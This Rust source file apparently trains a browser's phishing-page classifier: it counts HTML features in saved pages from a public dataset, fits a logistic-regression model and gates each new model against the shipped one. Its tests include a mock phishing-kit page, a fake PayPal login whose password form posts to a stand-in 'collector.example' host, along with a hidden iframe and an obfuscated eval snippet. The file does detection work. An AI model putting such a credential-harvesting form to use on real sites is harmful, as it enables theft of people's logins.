//! Trains Rift AI's page model (docs/architecture.md §16.1) on saved pages.
//!
//!   page counts <index.sql|index.tsv> <pages-dir> <out.tsv>
//!   page train <out-model> --counts FILE[:WEIGHT]... [--recent FILE[:WEIGHT]] [--champion MODEL]
//!
//! `counts` reads each page as text (an HTML5 parser; no scripts run) and
//! writes what the browser's script counts in a live one (`PAGE_COUNTS` in
//! BrowserActivity.kt): one `label<TAB>url<TAB>report` line per page, the
//! report being the JSON the app receives. The index is the Phishing
//! Websites Dataset's `index.sql` (Ariyadasa, Fernando and Fernando,
//! Mendeley Data, 2021, CC BY 4.0) or the `index.tsv` that
//! `fetch_pages.py` writes for the monthly retrain's fresh pages.
//!
//! `train` reads counts, turns them into features with
//! `rift_core::pagemodel::features`, the code the app runs, and trains.
//! Splits are by site (80/10/10), so the test measures sites the model never
//! saw. The L2 strength is chosen on validation, thresholds are set there
//! (High at 0.5% of legitimate pages, Elevated at 2%), and the test split is
//! scored with `PageModel`, as the app scores. With `--recent` and
//! `--champion`, the recent pages' test split is the gate's: the new model
//! is written only if it does as well there as the shipped one (`gate`).
//!
//! An offline maintainer tool over files the maintainer chose.
#![allow(clippy::indexing_slicing, clippy::arithmetic_side_effects)]

use std::collections::hash_map::DefaultHasher;
use std::fs;
use std::hash::{Hash, Hasher};
use std::path::Path;
use std::process::ExitCode;

use rift_core::pagemodel::{self, FEATURES, PageCounts, PageLevel, PageModel, site_key};
use scraper::{ElementRef, Html, Node};
use url::Url;

/// Pages larger than this are cut, as no live page script reads more.
const MAX_HTML_BYTES: usize = 4 * 1024 * 1024;

struct Row {
    url: String,
    file: String,
    phishing: bool,
}

/// The `(rec_id, 'url', 'file', result, 'date')` tuples of the dump.
fn rows(sql: &str) -> Vec<Row> {
    let mut out = Vec::new();
    let mut fields: Vec<String> = Vec::new();
    let mut field = String::new();
    let mut in_tuple = false;
    let mut quoted = false;
    let mut chars = sql.chars();
    while let Some(c) = chars.next() {
        if quoted {
            match c {
                '\\' => {
                    if let Some(next) = chars.next() {
                        field.push(next);
                    }
                }
                '\'' => quoted = false,
                _ => field.push(c),
            }
            continue;
        }
        match c {
            '(' if !in_tuple => {
                in_tuple = true;
                fields.clear();
                field.clear();
            }
            '\'' if in_tuple => quoted = true,
            ',' if in_tuple => fields.push(std::mem::take(&mut field).trim().to_owned()),
            ')' if in_tuple => {
                fields.push(std::mem::take(&mut field).trim().to_owned());
                in_tuple = false;
                if let [_, url, file, result, ..] = fields.as_slice()
                    && (result.trim() == "0" || result.trim() == "1")
                {
                    out.push(Row {
                        url: url.clone(),
                        file: file.clone(),
                        phishing: result.trim() == "1",
                    });
                }
            }
            _ if in_tuple => field.push(c),
            _ => {}
        }
    }
    out
}

fn nowhere(v: &str) -> bool {
    let v = v.trim().to_lowercase();
    v.is_empty() || v.starts_with('#') || v.starts_with("javascript:") || v == "about:blank"
}

struct Page<'a> {
    base: &'a Url,
    me: String,
}

impl Page<'_> {
    fn other(&self, v: Option<&str>) -> bool {
        let Some(v) = v.filter(|v| !v.is_empty()) else {
            return false;
        };
        self.base.join(v.trim()).is_ok_and(|u| {
            matches!(u.scheme(), "http" | "https")
                && u.host_str().is_some_and(|h| site_key(h) != self.me)
        })
    }
}

/// Visible text: the body's text nodes outside scripts, styles and templates.
fn visible_text(element: ElementRef<'_>, out: &mut String) {
    for child in element.children() {
        match child.value() {
            Node::Text(text) => {
                out.push_str(text);
                out.push(' ');
            }
            Node::Element(e) => {
                if matches!(
                    e.name(),
                    "script" | "style" | "noscript" | "template" | "head"
                ) {
                    continue;
                }
                if let Some(child) = ElementRef::wrap(child) {
                    visible_text(child, out);
                }
            }
            _ => {}
        }
        if out.len() > 200_000 {
            return;
        }
    }
}

/// The counts the browser's script makes, from saved HTML.
fn count(url: &Url, html: &str) -> PageCounts {
    let doc = Html::parse_document(html);
    let page = Page {
        base: url,
        me: site_key(url.host_str().unwrap_or_default()),
    };
    let mut k = PageCounts::default();
    let obfuscation = [
        "eval(",
        "atob(",
        "unescape(",
        "fromCharCode",
        "document.write(",
    ];
    for node in doc.tree.nodes() {
        let Some(el) = ElementRef::wrap(node) else {
            continue;
        };
        let e = el.value();
        k.el += 1;
        if e.attr("oncontextmenu").is_some() {
            k.rc = 1;
        }
        match e.name() {
            "input" => match e.attr("type").map(str::to_ascii_lowercase).as_deref() {
                Some("password") => k.pw += 1,
                Some("hidden") => k.hi += 1,
                _ => {}
            },
            "form" => {
                k.fm += 1;
                if let Some(v) = e.attr("action") {
                    if nowhere(v) {
                        k.fnull += 1;
                    } else {
                        let v = v.trim().to_lowercase();
                        if v.starts_with("mailto:") {
                            k.fmail += 1;
                        } else if page.other(Some(&v)) {
                            k.fx += 1;
                        }
                        let path = v.split(['?', '#']).next().unwrap_or_default();
                        if path.ends_with(".php") {
                            k.fphp += 1;
                        }
                    }
                }
            }
            "a" => {
                if let Some(v) = e.attr("href") {
                    k.a += 1;
                    if nowhere(v) {
                        k.an += 1;
                    } else if page.other(Some(v)) {
                        k.ax += 1;
                    }
                }
            }
            "meta"
                if e.attr("http-equiv")
                    .is_some_and(|v| v.eq_ignore_ascii_case("refresh")) =>
            {
                k.mr = 1;
            }
            _ => {}
        }
        let name = e.name();
        let resource = match name {
            "img" | "script" | "iframe" => e.attr("src"),
            "link" => e.attr("href"),
            _ => None,
        };
        if let Some(v) = resource {
            k.r += 1;
            if page.other(Some(v)) {
                k.rx += 1;
            }
        }
        if name == "link"
            && e.attr("rel").is_some_and(|rel| {
                rel.split_ascii_whitespace()
                    .any(|t| t.eq_ignore_ascii_case("icon"))
            })
            && page.other(e.attr("href"))
        {
            k.fv = 1;
        }
        if name == "iframe" || name == "frame" {
            k.ifr += 1;
            let style = e
                .attr("style")
                .unwrap_or_default()
                .to_lowercase()
                .replace(' ', "");
            if e.attr("width") == Some("0")
                || e.attr("height") == Some("0")
                || e.attr("hidden").is_some()
                || style.contains("display:none")
                || style.contains("visibility:hidden")
            {
                k.ih += 1;
            }
        }
        if name == "script" {
            k.sc += 1;
            if let Some(v) = e.attr("src") {
                if page.other(Some(v)) {
                    k.sx += 1;
                }
            } else {
                let text: String = el
                    .text()
                    .collect::<String>()
                    .chars()
                    .take(200_000)
                    .collect();
                for token in obfuscation {
                    k.ob += u32::try_from(text.matches(token).count()).unwrap_or(u32::MAX);
                }
                let squashed = text.replace(' ', "");
                if squashed.contains("event.button==2") {
                    k.rc = 1;
                }
            }
        }
    }
    k.hb = u32::try_from(html.chars().count()).unwrap_or(u32::MAX);
    let first = |tag: &str| {
        doc.tree
            .nodes()
            .filter_map(ElementRef::wrap)
            .find(|e| e.value().name() == tag)
    };
    if let Some(title) = first("title") {
        k.title = title
            .text()
            .collect::<String>()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
    }
    let mut text = String::new();
    if let Some(body) = first("body") {
        visible_text(body, &mut text);
    }
    let text = text.split_whitespace().collect::<Vec<_>>().join(" ");
    k.cp = u32::from(text.contains(['\u{a9}', '\u{ae}', '\u{2122}']));
    k.text = text;
    k.bound();
    k
}

fn split_of(site: &str) -> u8 {
    let mut h = DefaultHasher::new();
    site.hash(&mut h);
    (h.finish() % 10) as u8
}

struct Example {
    x: Vec<f32>,
    y: f32,
    /// How much the page counts in training.
    w: f32,
}

fn sigmoid(z: f32) -> f32 {
    1.0 / (1.0 + (-z).exp())
}

/// Logistic regression on standardised features, full-batch gradient
/// descent with Adam; returns weights (last is the bias).
fn train(data: &[Example], mean: &[f32], std: &[f32], l2: f32, epochs: usize) -> Vec<f32> {
    let d = mean.len();
    let mut w = vec![0.0f32; d + 1];
    let (mut m, mut v) = (vec![0.0f32; d + 1], vec![0.0f32; d + 1]);
    let (b1, b2, lr) = (0.9f32, 0.999f32, 0.05f32);
    let n: f32 = data.iter().map(|e| e.w).sum::<f32>().max(1.0);
    for t in 1..=epochs {
        let mut g = vec![0.0f32; d + 1];
        for ex in data {
            let mut z = w[d];
            for j in 0..d {
                z += w[j] * (ex.x[j] - mean[j]) / std[j];
            }
            let err = ex.w * (sigmoid(z) - ex.y);
            for j in 0..d {
                g[j] += err * (ex.x[j] - mean[j]) / std[j];
            }
            g[d] += err;
        }
        for j in 0..=d {
            let grad = g[j] / n + if j < d { l2 * w[j] } else { 0.0 };
            m[j] = b1 * m[j] + (1.0 - b1) * grad;
            v[j] = b2 * v[j] + (1.0 - b2) * grad * grad;
            let mh = m[j] / (1.0 - b1.powi(t as i32));
            let vh = v[j] / (1.0 - b2.powi(t as i32));
            w[j] -= lr * mh / (vh.sqrt() + 1e-8);
        }
    }
    w
}

/// Folds standardisation into the weights: (raw weights, raw bias).
fn fold(w: &[f32], mean: &[f32], std: &[f32]) -> (Vec<f32>, f32) {
    let d = mean.len();
    let raw: Vec<f32> = (0..d).map(|j| w[j] / std[j]).collect();
    let bias = w[d] - (0..d).map(|j| w[j] * mean[j] / std[j]).sum::<f32>();
    (raw, bias)
}

fn scores(data: &[Example], raw: &[f32], bias: f32) -> Vec<(f32, bool)> {
    data.iter()
        .map(|ex| {
            let z = raw.iter().zip(&ex.x).fold(bias, |z, (w, x)| z + w * x);
            (sigmoid(z), ex.y > 0.5)
        })
        .collect()
}

fn auc(s: &[(f32, bool)]) -> f64 {
    let mut s = s.to_vec();
    s.sort_by(|a, b| a.0.total_cmp(&b.0));
    let (mut rank_sum, mut pos) = (0.0f64, 0.0f64);
    for (i, (_, p)) in s.iter().enumerate() {
        if *p {
            rank_sum += (i + 1) as f64;
            pos += 1.0;
        }
    }
    let neg = s.len() as f64 - pos;
    (rank_sum - pos * (pos + 1.0) / 2.0) / (pos * neg)
}

/// The lowest score that flags at most `fpr` of the legitimate pages.
fn threshold(s: &[(f32, bool)], fpr: f64) -> f32 {
    let mut neg: Vec<f32> = s.iter().filter(|(_, p)| !p).map(|(x, _)| *x).collect();
    neg.sort_by(|a, b| b.total_cmp(a));
    let allowed = (neg.len() as f64 * fpr).floor() as usize;
    neg.get(allowed).map_or(1.0, |x| (x + 1e-6).min(1.0))
}

fn rates(s: &[(f32, bool)], t: f32) -> (f64, f64) {
    let pos = s.iter().filter(|(_, p)| *p).count().max(1) as f64;
    let neg = s.iter().filter(|(_, p)| !p).count().max(1) as f64;
    let tp = s.iter().filter(|(x, p)| *p && *x >= t).count() as f64;
    let fp = s.iter().filter(|(x, p)| !*p && *x >= t).count() as f64;
    (tp / pos, fp / neg)
}

/// One counted page: its address, label and the counts the app would see.
struct Counted {
    host: String,
    phishing: bool,
    counts: PageCounts,
}

/// `index.sql` (the dataset's dump) or `index.tsv` (`fetch_pages.py`:
/// `url<TAB>file<TAB>label` lines).
fn index(path: &str, text: &str) -> Vec<Row> {
    if !path.ends_with(".tsv") {
        return rows(text);
    }
    text.lines()
        .filter_map(|line| {
            let mut f = line.split('\t');
            let (url, file, label) = (f.next()?, f.next()?, f.next()?);
            matches!(label, "0" | "1").then(|| Row {
                url: url.to_owned(),
                file: file.to_owned(),
                phishing: label == "1",
            })
        })
        .collect()
}

/// `counts <index> <pages-dir> <out.tsv>`: each page as
/// `label<TAB>url<TAB>counts JSON`, the report the page script sends.
fn counts_cmd(args: &[String]) -> ExitCode {
    let [index_path, dir, out_path] = args else {
        eprintln!("usage: page counts <index.sql|index.tsv> <pages-dir> <out.tsv>");
        return ExitCode::FAILURE;
    };
    let text = match fs::read(index_path) {
        Ok(b) => String::from_utf8_lossy(&b).into_owned(),
        Err(e) => {
            eprintln!("page: {index_path}: {e}");
            return ExitCode::FAILURE;
        }
    };
    let (mut out, mut missing) = (String::new(), 0usize);
    let mut written = 0usize;
    for row in index(index_path, &text) {
        let Ok(url) = Url::parse(row.url.trim()) else {
            continue;
        };
        if url.host_str().is_none() || row.url.contains(['\t', '\n']) {
            continue;
        }
        let Ok(bytes) = fs::read(Path::new(dir).join(&row.file)) else {
            missing += 1;
            continue;
        };
        let bytes = &bytes[..bytes.len().min(MAX_HTML_BYTES)];
        let counts = count(&url, &String::from_utf8_lossy(bytes));
        let Ok(json) = serde_json::to_string(&counts) else {
            continue;
        };
        out.push_str(&format!("{}\t{}\t{json}\n", u8::from(row.phishing), url));
        written += 1;
        if written.is_multiple_of(5000) {
            eprintln!("page: {written} pages counted");
        }
    }
    eprintln!("page: {written} pages counted ({missing} files missing)");
    if let Err(e) = fs::write(out_path, out) {
        eprintln!("page: {out_path}: {e}");
        return ExitCode::FAILURE;
    }
    ExitCode::SUCCESS
}

/// Reads a counts file; a malformed line is skipped, as a report would be.
fn read_counts(path: &str) -> Result<Vec<Counted>, String> {
    let text = fs::read_to_string(path).map_err(|e| format!("{path}: {e}"))?;
    Ok(text
        .lines()
        .filter_map(|line| {
            let mut f = line.splitn(3, '\t');
            let (label, url, json) = (f.next()?, f.next()?, f.next()?);
            let host = Url::parse(url).ok()?.host_str()?.to_owned();
            Some(Counted {
                host,
                phishing: match label {
                    "1" => true,
                    "0" => false,
                    _ => return None,
                },
                counts: PageCounts::from_report(json)?,
            })
        })
        .collect())
}

fn split_index(host: &str) -> usize {
    match split_of(&site_key(host)) {
        0..=7 => 0,
        8 => 1,
        _ => 2,
    }
}

/// What a model does on a set of pages.
struct Measured {
    pages: usize,
    auc: f64,
    high: (f64, f64),
    elevated: (f64, f64),
}

fn measure(model: &PageModel, pages: &[&Counted]) -> Measured {
    let (mut s, mut levels) = (Vec::new(), Vec::new());
    for p in pages {
        let score = model.score(&p.host, &p.counts);
        s.push((score.score, p.phishing));
        levels.push((score.level, p.phishing));
    }
    let rate = |min: PageLevel| {
        let pos = levels.iter().filter(|(_, p)| *p).count().max(1) as f64;
        let neg = levels.iter().filter(|(_, p)| !p).count().max(1) as f64;
        let tp = levels.iter().filter(|(l, p)| *p && *l >= min).count() as f64;
        let fp = levels.iter().filter(|(l, p)| !*p && *l >= min).count() as f64;
        (tp / pos, fp / neg)
    };
    Measured {
        pages: pages.len(),
        auc: auc(&s),
        high: rate(PageLevel::High),
        elevated: rate(PageLevel::Elevated),
    }
}

fn describe(m: &Measured) -> String {
    format!(
        "{} pages, AUC {:.4}; High: {:.1}% of phishing, {:.2}% of legitimate; Elevated or High: {:.1}% of phishing, {:.2}% of legitimate",
        m.pages,
        m.auc,
        m.high.0 * 100.0,
        m.high.1 * 100.0,
        m.elevated.0 * 100.0,
        m.elevated.1 * 100.0
    )
}

/// Fewest pages of each label in the recent test split for the gate to judge.
const GATE_MIN_PAGES: usize = 150;

/// The gate (docs/reports/page-model.md, "Learning from new pages"): on the
/// recent pages of sites no model trained on, the new model may not raise
/// more false alarms at High than 1%, nor more than the shipped model by
/// 0.25 points, nor catch fewer phishing pages at High, nor lose AUC.
fn gate(new: &Measured, shipped: &Measured, phishing: usize, legit: usize) -> Vec<String> {
    let mut refused = Vec::new();
    if phishing < GATE_MIN_PAGES || legit < GATE_MIN_PAGES {
        refused.push(format!(
            "too few recent pages to judge: {phishing} phishing and {legit} legitimate, at least {GATE_MIN_PAGES} of each needed"
        ));
    }
    if new.high.1 > 0.01 || new.high.1 > shipped.high.1 + 0.0025 {
        refused.push(format!(
            "{:.2}% of recent legitimate pages at High, against the shipped model's {:.2}%",
            new.high.1 * 100.0,
            shipped.high.1 * 100.0
        ));
    }
    if new.high.0 + 1e-9 < shipped.high.0 {
        refused.push(format!(
            "{:.1}% of recent phishing pages at High, against the shipped model's {:.1}%",
            new.high.0 * 100.0,
            shipped.high.0 * 100.0
        ));
    }
    if new.auc + 0.002 < shipped.auc {
        refused.push(format!(
            "AUC {:.4} on recent pages, against the shipped model's {:.4}",
            new.auc, shipped.auc
        ));
    }
    refused
}

/// `train <out-model> --counts FILE[:WEIGHT]... [--recent FILE] [--champion MODEL]`
fn train_cmd(args: &[String]) -> ExitCode {
    let Some(out_path) = args.first() else {
        eprintln!(
            "usage: page train <out-model> --counts FILE[:WEIGHT]... [--recent FILE[:WEIGHT]] [--champion MODEL]"
        );
        return ExitCode::FAILURE;
    };
    let mut sources: Vec<(String, f32, bool)> = Vec::new();
    let mut champion = None;
    let mut it = args[1..].iter();
    while let Some(flag) = it.next() {
        let Some(value) = it.next() else {
            eprintln!("page: {flag} needs a value");
            return ExitCode::FAILURE;
        };
        match flag.as_str() {
            "--counts" | "--recent" => {
                let (path, weight) = match value.rsplit_once(':') {
                    Some((p, w)) if w.parse::<f32>().is_ok_and(|w| w > 0.0) => {
                        (p.to_owned(), w.parse().unwrap_or(1.0))
                    }
                    _ => (value.clone(), 1.0),
                };
                sources.push((path, weight, flag == "--recent"));
            }
            "--champion" => champion = Some(value.clone()),
            _ => {
                eprintln!("page: unknown option {flag}");
                return ExitCode::FAILURE;
            }
        }
    }
    // Every page, with its weight, whether it is recent, and its split.
    let mut pages: Vec<(Counted, f32, bool, usize)> = Vec::new();
    for (path, weight, recent) in &sources {
        match read_counts(path) {
            Ok(rows) => {
                eprintln!("page: {path}: {} pages, weight {weight}", rows.len());
                for c in rows {
                    let split = split_index(&c.host);
                    pages.push((c, *weight, *recent, split));
                }
            }
            Err(e) => {
                eprintln!("page: {e}");
                return ExitCode::FAILURE;
            }
        }
    }
    let examples = |split: usize| -> Vec<Example> {
        pages
            .iter()
            .filter(|p| p.3 == split)
            .map(|(c, w, _, _)| Example {
                x: pagemodel::features(&c.host, &c.counts),
                y: if c.phishing { 1.0 } else { 0.0 },
                w: *w,
            })
            .collect()
    };
    let (train_set, valid) = (examples(0), examples(1));
    eprintln!(
        "page: {} pages: train {}, validation {}",
        pages.len(),
        train_set.len(),
        valid.len()
    );
    let d = FEATURES.len();
    let n: f32 = train_set.iter().map(|e| e.w).sum::<f32>().max(1.0);
    let mean: Vec<f32> = (0..d)
        .map(|j| train_set.iter().map(|e| e.w * e.x[j]).sum::<f32>() / n)
        .collect();
    let std: Vec<f32> = (0..d)
        .map(|j| {
            let var = train_set
                .iter()
                .map(|e| e.w * (e.x[j] - mean[j]).powi(2))
                .sum::<f32>()
                / n;
            var.sqrt().max(1e-3)
        })
        .collect();
    let mut best: Option<(f64, f32, Vec<f32>)> = None;
    for l2 in [0.0f32, 1e-4, 1e-3, 1e-2] {
        let w = train(&train_set, &mean, &std, l2, 400);
        let (raw, bias) = fold(&w, &mean, &std);
        let s = scores(&valid, &raw, bias);
        let t = threshold(&s, 0.005);
        let (tpr, _) = rates(&s, t);
        eprintln!(
            "page: l2 {l2}: validation AUC {:.4}, recall at 0.5% false alarms {:.3}",
            auc(&s),
            tpr
        );
        if best.as_ref().is_none_or(|(b, _, _)| tpr > *b) {
            best = Some((tpr, l2, w));
        }
    }
    let Some((_, l2, w)) = best else {
        return ExitCode::FAILURE;
    };
    let (raw, bias) = fold(&w, &mean, &std);
    let s = scores(&valid, &raw, bias);
    let high = threshold(&s, 0.005);
    let elevated = threshold(&s, 0.02).min(high);
    // Means of legitimate training pages: what the reasons compare against.
    let legit: Vec<&Example> = train_set.iter().filter(|e| e.y < 0.5).collect();
    let ln = legit.len().max(1) as f32;
    let mut body = format!("bias {bias}\nhigh {high}\nelevated {elevated}\n");
    for (j, name) in FEATURES.iter().enumerate() {
        let m = legit.iter().map(|e| e.x[j]).sum::<f32>() / ln;
        body.push_str(&format!("feature {name} {} {m}\n", raw[j]));
    }
    let model = match PageModel::parse(&body) {
        Ok(m) => m,
        Err(e) => {
            eprintln!("page: the trained model does not parse: {e}");
            return ExitCode::FAILURE;
        }
    };
    // Measured as the app scores, with the app's code, on sites never trained on.
    let test: Vec<&Counted> = pages.iter().filter(|p| p.3 == 2).map(|p| &p.0).collect();
    let recent: Vec<&Counted> = pages
        .iter()
        .filter(|p| p.3 == 2 && p.2)
        .map(|p| &p.0)
        .collect();
    let summary = format!(
        "test (sites never seen): {}",
        describe(&measure(&model, &test))
    );
    println!("{summary}");
    let mut recent_line = String::new();
    if !recent.is_empty() {
        let new = measure(&model, &recent);
        recent_line = format!("recent pages (sites never seen): {}", describe(&new));
        println!("{recent_line}");
        if let Some(path) = &champion {
            let shipped = match fs::read_to_string(path)
                .map_err(|e| e.to_string())
                .and_then(|t| PageModel::parse(&t).map_err(|e| e.to_string()))
            {
                Ok(m) => measure(&m, &recent),
                Err(e) => {
                    eprintln!("page: {path}: {e}");
                    return ExitCode::FAILURE;
                }
            };
            println!("shipped model on the same pages: {}", describe(&shipped));
            let phishing = recent.iter().filter(|c| c.phishing).count();
            let refused = gate(&new, &shipped, phishing, recent.len() - phishing);
            if !refused.is_empty() {
                println!("refused:");
                for r in &refused {
                    println!("  {r}");
                }
                return ExitCode::from(2);
            }
            println!("passed the gate");
        }
    }
    let names: Vec<&str> = sources
        .iter()
        .map(|(p, _, _)| p.rsplit('/').next().unwrap_or(p))
        .collect();
    let mut out = format!(
        "# Rift AI page model (docs/architecture.md §16.1), written by tools/rift-train page.\n\
         # Data: Phishing Websites Dataset, Ariyadasa, Fernando and Fernando, Mendeley Data 2021, CC BY 4.0\n\
         # (doi:10.17632/n96ncsr5g4.1), and pages fetched by the monthly retrain, as counts.\n\
         # {} pages ({}); split by site 80/10/10; l2 {l2}.\n\
         # {summary}\n",
        pages.len(),
        names.join(", ")
    );
    if !recent_line.is_empty() {
        out.push_str(&format!("# {recent_line}\n"));
    }
    out.push_str(&body);
    if let Err(e) = fs::write(out_path, out) {
        eprintln!("page: {out_path}: {e}");
        return ExitCode::FAILURE;
    }
    ExitCode::SUCCESS
}

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().collect();
    match args.get(1).map(String::as_str) {
        Some("counts") => counts_cmd(&args[2..]),
        Some("train") => train_cmd(&args[2..]),
        _ => {
            eprintln!(
                "usage: page counts <index.sql|index.tsv> <pages-dir> <out.tsv>\n       page train <out-model> --counts FILE[:WEIGHT]... [--recent FILE[:WEIGHT]] [--champion MODEL]"
            );
            ExitCode::FAILURE
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_dump_is_read_with_escapes_and_commas() {
        let sql = r"INSERT INTO `index` VALUES (1, 'http://a.example/x?a=1,2', '1.html', 1, '2021'),(2,'http://b.example/it\'s','2.html',0,'2021');";
        let r = rows(sql);
        assert_eq!(r.len(), 2);
        assert_eq!(r[0].url, "http://a.example/x?a=1,2");
        assert_eq!(r[0].file, "1.html");
        assert!(r[0].phishing);
        assert_eq!(r[1].url, "http://b.example/it's");
        assert!(!r[1].phishing);
    }

    #[test]
    fn the_gate_refuses_more_false_alarms_fewer_catches_or_too_few_pages() {
        let m = |high: (f64, f64), auc| Measured {
            pages: 1000,
            auc,
            high,
            elevated: high,
        };
        let shipped = m((0.40, 0.004), 0.90);
        assert!(gate(&m((0.45, 0.004), 0.91), &shipped, 500, 500).is_empty());
        assert_eq!(gate(&m((0.45, 0.008), 0.91), &shipped, 500, 500).len(), 1);
        assert_eq!(gate(&m((0.39, 0.004), 0.91), &shipped, 500, 500).len(), 1);
        assert_eq!(gate(&m((0.45, 0.004), 0.89), &shipped, 500, 500).len(), 1);
        assert_eq!(gate(&m((0.45, 0.004), 0.91), &shipped, 100, 500).len(), 1);
        // Never above 1% of legitimate pages, whatever the shipped model does.
        assert_eq!(
            gate(&m((0.9, 0.011), 0.99), &m((0.4, 0.011), 0.9), 500, 500).len(),
            1
        );
    }

    #[test]
    fn a_tsv_index_is_read() {
        let r = index(
            "x/index.tsv",
            "https://a.example/\t1-0.html\t1\nbad line\nhttps://b.example/\t0-1.html\t0\n",
        );
        assert_eq!(r.len(), 2);
        assert!(r[0].phishing && !r[1].phishing);
        assert_eq!(r[1].file, "0-1.html");
    }

    #[test]
    fn a_kit_is_counted_as_the_page_script_counts_it() {
        let url = Url::parse("https://login.paypa1-help.example/signin/").unwrap();
        let html = r##"<html><head><title>PayPal Log in</title><link rel="Shortcut Icon" href="https://www.paypalobjects.com/favicon.ico"></head>
            <body oncontextmenu="return false"><form action="https://collector.example/post.php" method="post">
            <input type="hidden" name="a"><input type="password" name="p"></form>
            <a href="#">Help</a><a href="javascript:void(0)">x</a><a href="/home">home</a><a href="https://www.paypal.com/">p</a>
            <iframe src="https://t.example/" width="0" height="0"></iframe>
            <script>eval(atob('YQ=='))</script><script src="https://cdn.example/x.js"></script>
            <p>Your account has been limited &copy; 2021</p></body></html>"##;
        let k = count(&url, html);
        assert_eq!(
            (k.pw, k.hi, k.fm, k.fx, k.fphp, k.fnull),
            (1, 1, 1, 1, 1, 0)
        );
        assert_eq!((k.a, k.an, k.ax), (4, 2, 1));
        assert_eq!((k.ifr, k.ih, k.sc, k.sx, k.ob), (1, 1, 2, 1, 2));
        assert_eq!((k.fv, k.rc, k.cp), (1, 1, 1));
        assert_eq!(k.title, "PayPal Log in");
        assert!(k.text.contains("Your account has been limited"));
        assert!(!k.text.contains("eval"));
    }
}
